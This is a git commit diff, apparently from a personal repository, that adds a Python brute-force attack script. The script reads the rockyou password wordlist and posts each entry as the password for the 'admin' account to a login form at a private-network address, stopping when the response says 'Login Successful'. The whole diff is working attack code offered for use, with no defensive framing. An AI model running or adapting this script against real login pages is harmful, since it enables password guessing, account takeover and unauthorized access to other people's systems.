ed679002b8e3a4e7a68715ce93f1c2972083d71c
riceccc114 <H1152605678@Outlook.com>
2025-04-14 21:02:53 +0100

    Add files via upload

--- brute_force_attack/brute_force.py
+++ brute_force_attack/brute_force.py
@@ -1,10 +1,20 @@
 import requests
 
-url = "http://192.168.164.242:5000/login"
+url = "http://192.168.160.242:5000/login"
 username = "admin"
 wordlist = "/usr/share/wordlists/rockyou.txt"
- try:
-        response = requests.post(url, data=data, timeout=5)  #timeout detection
+
+with open(wordlist, "r", encoding="latin-1") as f:
+    passwords = f.readlines()
+
+for password in passwords:
+    password = password.strip()
+    data = {
+        "account": username,
+        "password": password
+    }
+    try:
+        response = requests.post(url, data=data, timeout=5)  # 加超时
         if "Login Successful" in response.text:
             print(f"[+] Password found: {password}")
             break
